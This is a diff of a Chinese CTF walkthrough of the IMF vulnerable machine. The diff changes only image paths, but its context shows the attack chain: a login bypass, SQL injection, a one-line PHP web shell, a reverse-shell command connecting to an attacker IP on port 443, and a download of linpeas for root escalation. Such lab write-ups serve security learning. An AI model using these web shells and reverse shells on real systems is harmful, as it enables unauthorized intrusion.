@@ -311,7 +311,7 @@ rmichaels
 akeith
 estone
 ~~~
-![](./image/Pasted image 20241030130237.png)
+![](./Pasted image 20241030130237.png)
 自己再构造一下字典
 ~~~
 ┌──(kali㉿kali)-[~/imf]                                   
@@ -422,14 +422,14 @@ Finished
 
 还是没有什么信息
 查看一下源代码发现了之前漏掉的关键线索
-![](./image/Pasted image 20241030135056.png)
+![](./Pasted image 20241030135056.png)
 ~~~
 ┌──(kali㉿kali)-[~/imf]
 └─$ echo "YWxsdGhlZmlsZXM=" | base64 -d
 allthefiles 
 ~~~
 解密得到 flag1\{allthefiles\}
-![](./image/Pasted image 20241030135258.png)
+![](./Pasted image 20241030135258.png)
 这里的文件名看起来似乎也是base64
 ~~~
 ┌──(kali㉿kali)-[~/imf]
@@ -445,11 +445,11 @@ flag2\{aW1mYWRtaW5pc3RyYXRvcg==\}
 imfadministrator
 ~~~
 可能是一个目录
-![](./image/Pasted image 20241030135920.png)
+![](./Pasted image 20241030135920.png)
 查看源码，roger说他把密码硬编码了，应该是直接把密码写死在代码里
-![](./image/Pasted image 20241030140909.png)
+![](./Pasted image 20241030140909.png)
 先用sqlmap跑一下吧
-![](./image/Pasted image 20241030140951.png)
+![](./Pasted image 20241030140951.png)
 看来应该不存在sql注入
 爆破一下目录
 ~~~
@@ -480,8 +480,8 @@ Finished
 ~~~
 都无法直接访问，还是尝试登录吧，用户名我们已经有了，硬编码会不会因为php的解析造成逻辑漏洞呢
 传入一个数组居然就绕过了
-![](./image/Pasted image 20241030151118.png)
-![](./image/Pasted image 20241030151238.png)
+![](./Pasted image 20241030151118.png)
+![](./Pasted image 20241030151238.png)
 解密得到 flag3\{continueTOcms\}
 ~~~
 ┌──(kali㉿kali)-[~/imf]
@@ -489,14 +489,14 @@ Finished
 continueTOcms   
 ~~~
 访问，似乎列出了一些名单，get参数可以测试一下
-![](./image/Pasted image 20241030153420.png)
-![](./image/Pasted image 20241030153355.png)
+![](./Pasted image 20241030153420.png)
+![](./Pasted image 20241030153355.png)
 发现有sql报错，试一下sql注入
 可以自己准备一些常见sql的字典，可以在不使用sqlmap的情况下确定是否存在sql注入(这里需要url编码)
-![](./image/Pasted image 20241030162041.png)
+![](./Pasted image 20241030162041.png)
 发现了注入点，手注试试！
 没有回显，还是要写脚本
-![](./image/Pasted image 20241030165124.png)
+![](./Pasted image 20241030165124.png)
 可以爆出指定列的所有值
 ~~~python
 import requests
@@ -660,7 +660,7 @@ PS C:\Users\lizis\Desktop\python> & C:/python3.12/python.exe c:/Users/lizis/Desk
 列 pagename 的值有: ['disavowlist,home,tutorials-incomplete,upload']
 PS C:\Users\lizis\Desktop\python>
 ~~~
-![](./image/Pasted image 20241030202834.png)
+![](./Pasted image 20241030202834.png)
 有个二维码，扫一下咯
 在kali中可以安装zbar-tools来扫描二维码
 ~~~
@@ -671,16 +671,16 @@ scanned 1 barcode symbols from 1 images in 0.04 seconds
 ~~~
 解码一下~ flag4\{uploadr942.php\}
 似乎可以上传文件捏
-![](./image/Pasted image 20241030203546.png)
+![](./Pasted image 20241030203546.png)
 构造一个简单的木马
 ~~~
 ┌──(kali㉿kali)-[~/imf]
 └─$ cat shell.php 
 <?php system($_GET[cmd]);?>
 ~~~
-![](./image/Pasted image 20241102210401.png)
+![](./Pasted image 20241102210401.png)
 似乎禁用了system函数，试一下反引号，似乎不可以直接用
-![](./image/Pasted image 20241102210502.png)
+![](./Pasted image 20241102210502.png)
 最后构造出如下payload
 
 ~~~request
@@ -774,7 +774,7 @@ File successfully uploaded.
 
 ~~~
 访问给出的地址
-![](./image/Pasted image 20241102210657.png)
+![](./Pasted image 20241102210657.png)
 可以RCE了，尝试反弹一个shell回来
 ~~~
 php -r '$sock=fsockopen("192.168.2.130",443);shell_exec("sh <&3 >&3 2>&3");'
@@ -783,11 +783,11 @@ php -r '$sock=fsockopen("192.168.2.130",443);shell_exec("sh <&3 >&3 2>&3");'
 ~~~
 php%20-r%20'%24sock%3Dfsockopen(%22192.168.2.130%22%2C443)%3Bshell_exec(%22sh%20%3C%263%20%3E%263%202%3E%263%22)%3B'
 ~~~
-![](./image/Pasted image 20241102211025.png)
+![](./Pasted image 20241102211025.png)
 终于我们拿到了shell
-![](./image/Pasted image 20241102210943.png)
+![](./Pasted image 20241102210943.png)
 完善一下交互性
-![](./image/Pasted image 20241102211154.png)
+![](./Pasted image 20241102211154.png)
 # 提权
 ~~~
 www-data@imf:/var/www/html/imfadministrator/uploads$ ls
@@ -851,7 +851,7 @@ Logout
 ~~~
 www-data@imf:/tmp$ wget http://192.168.2.130:80/linpeas.sh 
 ~~~
-![](./image/Pasted image 20241102213900.png)
+![](./Pasted image 20241102213900.png)
 尝试一下
 ~~~
                                                           
@@ -906,7 +906,7 @@ whoami
 root
 ~~~
 定妆照 flag6\{Gh0stProt0c0ls\}
-![](./image/Pasted image 20241102214253.png)
+![](./Pasted image 20241102214253.png)
 
 
 
